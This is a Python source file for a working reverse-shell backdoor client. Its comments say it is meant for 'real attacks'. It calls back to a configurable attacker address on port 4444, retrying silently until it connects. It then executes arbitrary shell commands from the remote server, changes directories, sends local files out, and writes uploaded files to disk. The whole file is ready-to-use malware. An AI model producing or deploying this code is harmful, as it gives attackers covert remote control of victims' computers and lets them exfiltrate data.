import socket
import os
import subprocess

# --- CONFIGURATION ---
ATTACKER_IP = "127.0.0.1" # Change this for real attacks
PORT = 4444

def send_file(sock, filename):
    if os.path.exists(filename):
        filesize = os.path.getsize(filename)
        sock.send(f"EXISTS {filesize}".encode())
        
        # Wait for Server to say OK
        sock.recv(1024) 
        
        with open(filename, "rb") as f:
            while True:
                chunk = f.read(4096)
                if not chunk: break
                sock.send(chunk)
    else:
        sock.send("ERROR: File not found".encode())

def receive_file(sock, command):
    # Command format from server: "UPLOAD filename filesize"
    _, filename, filesize = command.split()
    filesize = int(filesize)
    
    sock.send("OK".encode()) # Tell server we are ready
    
    with open(filename, "wb") as f:
        total_recv = 0
        while total_recv < filesize:
            data = sock.recv(4096)
            if not data: break
            f.write(data)
            total_recv += len(data)
            
    sock.send("[+] Upload Successful".encode())

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            s.connect((ATTACKER_IP, PORT))
            break
        except:
            pass # Keep trying silently

    while True:
        try:
            command = s.recv(1024).decode()
            
            if command.lower() == 'exit':
                break
            
            # --- HEIST LOGIC ---
            if command.startswith("download "):
                filename = command.split()[1]
                send_file(s, filename)
                
            elif command.startswith("UPLOAD "): # Note: Case sensitive check from our protocol
                receive_file(s, command)
                
            # --- NAVIGATION LOGIC ---
            elif command.startswith('cd '):
                try:
                    os.chdir(command[3:].strip())
                    s.send(f"[+] Changed to: {os.getcwd()}".encode())
                except Exception as e:
                    s.send(str(e).encode())

            # --- SHELL LOGIC ---
            else:
                proc = subprocess.Popen(command, shell=True, 
                                      stdout=subprocess.PIPE, 
                                      stderr=subprocess.PIPE, 
                                      stdin=subprocess.PIPE)
                output = proc.stdout.read() + proc.stderr.read()
                s.send(output if output else b"[+] Executed")
                
        except:
            break
    s.close()

if __name__ == "__main__":
    connect()